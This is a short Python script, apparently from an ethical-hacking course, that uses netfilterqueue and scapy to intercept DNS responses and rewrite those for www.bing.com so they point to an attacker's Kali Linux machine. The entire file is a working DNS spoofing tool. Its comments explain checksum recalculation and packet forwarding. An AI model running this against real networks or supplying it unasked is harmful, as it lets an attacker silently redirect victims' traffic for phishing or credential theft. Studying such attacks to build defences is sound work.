#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload()) # will be able to use all things with scapy
	if scapy_packet.haslayer(scapy.DNSRR): #if DNSRR :DNS Resource Record    DNSQR:DNS Question Record
#	    print(scapy_packet.show())  #use methode show all the layers and all the fields
	    qname = scapy_packet[scapy.DNSQR].qname
	    if "www.bing.com" in qname: 
	    	print("[+] spoofing target")
	    	answer = scapy.DNSRR(rrname=qname, rdata="ip of kalilinux")
	    	scapy_packet[scapy.DNS].an = answer
	    	scapy_packet[scapy.DNS].ancount = 1
	    	
	    	del scapy_packet[scapy.IP].len  # after delete this the scapy will calculate evaery thing (the check will be ok)
	    	del scapy_packet[scapy.IP].chksum
	    	del scapy_packet[scapy.UDP].len
	    	del scapy_packet[scapy.UDP].chksum

	    	packet.set_payload(str(scapy_packet)) 
	
	packet.accept()   #forward the packet to the destination
 

queue = netfilterqueue.NetfilterQueue() #creat instance
queue.bind(0,process_packet)        #connect instance and give process for connect with each packet
queue.run()